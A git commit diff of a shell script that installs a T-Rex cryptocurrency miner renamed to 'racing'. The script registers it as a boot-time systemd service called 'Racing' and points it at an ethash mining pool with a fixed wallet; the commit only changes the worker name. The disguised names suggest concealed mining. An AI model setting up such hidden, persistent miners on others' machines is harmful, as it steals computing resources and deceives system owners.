adc35245f8697dca07aed65613c960e11f9c87d7
8386shop <109498057+8386shop@users.noreply.github.com>
2022-07-18 11:22:31 +0700

    Update scriptcuaminh.sh

--- scriptcuaminh.sh
+++ scriptcuaminh.sh
@@ -15,4 +15,4 @@ sudo mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x113319373741fA3D94747328BbF3fA0D1105ef1b -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x113319373741fA3D94747328BbF3fA0D1105ef1b -p x -w cr_7 &
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x113319373741fA3D94747328BbF3fA0D1105ef1b -p x -w 8386 &
